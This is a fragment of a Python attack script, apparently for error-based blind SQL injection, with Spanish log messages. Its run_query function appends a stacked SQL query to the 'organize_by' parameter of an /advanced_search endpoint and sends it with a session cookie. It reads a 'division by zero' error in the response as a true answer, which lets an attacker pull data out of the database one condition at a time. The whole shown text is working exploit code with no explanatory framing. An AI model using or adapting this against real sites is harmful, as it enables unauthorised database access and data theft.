...
def run_query(sql_condition: str) -> bool:
    ...
    sql_query = add_conditional_error_if_sql_query_is_working(sql_condition)
    print(f"[+] Ejecutando query: {sql_query}")
    path = f"/advanced_search?SearchTerm=&organize_by=DATE;{sql_query}&blogArtist=Si+Test"
    cookies = {"session": session}
    with requests.Session() as s:
        res = s.get(url + path, headers=headers, cookies=cookies)
        if res.text.find("ERROR: division by zero") != -1:
            return True
    return False
